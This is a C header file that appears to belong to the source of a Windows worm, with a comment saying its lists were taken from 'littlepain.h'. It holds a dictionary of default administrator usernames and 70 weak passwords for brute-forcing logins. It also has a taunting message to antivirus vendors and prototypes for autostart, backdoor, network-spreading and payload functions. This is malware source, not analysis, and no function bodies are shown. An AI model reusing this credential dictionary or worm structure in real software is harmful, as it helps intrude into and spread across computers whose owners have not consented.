#ifndef DATA_GLOBALS_H
#define DATA_GLOBALS_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <stdint.h>

/* ------------------------------------------------------------
   Passwords and users list (taken from littlepain.h)
   ------------------------------------------------------------ */
#define USERS_NUM 11
#define PWD_NUM 70

static char *users_list[] = {
    NULL,
    "admin",
    "admins",
    "administrator",
    "amministratore",
    "guest",
    "root",
    "owner",
    "computer",
    "wwwadmin",
    "default"
};

static char *passwords_list[] = {
    NULL,
    "qwerty",
    "007",
    "123",
    "1234",
    "12345",
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "1234567890",
    "access",
    "command",
    "bob",
    "billy",
    "ibm",
    "internet",
    "winxp",
    "bitch",
    "data",
    "database",
    "home",
    "server",
    "login",
    "loginpass",
    "linux",
    "pass",
    "pass1234",
    "win2000",
    "win2k",
    "win98",
    "win95",
    "winnt",
    "winpass",
    "root",
    "web",
    "user",
    "test",
    "pwd",
    "qw",
    "qwe",
    "sex",
    "sexy",
    "oracle",
    "mysql",
    "nokia",
    "siemens",
    "sam",
    "hell",
    "intranet",
    "internet",
    "boss",
    "hacker",
    "system",
    "2006",
    "2005",
    "2004",
    "2000",
    "aaa",
    "abcd",
    "123abc",
    "apollo13",
    "apple",
    "777",
    "111",
    "911",
    "abcde",
    "testing",
    "start",
    "www"
};

static char *msg_to_avers = "We make your business!";

/* ------------------------------------------------------------
   Function prototypes (refactored)
   ------------------------------------------------------------ */
void _AutoStart(BYTE *param_1);
DWORD WINAPI _BackDoor_4(LPVOID Data);
DWORD WINAPI _L0cal_4(LPVOID Data);
void _NetSpread(uint32_t param_1, LPCSTR param_2);
void _Payload(void);
DWORD WINAPI extra(LPVOID Data);

/* Entry point */
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);

#endif /* DATA_GLOBALS_H */
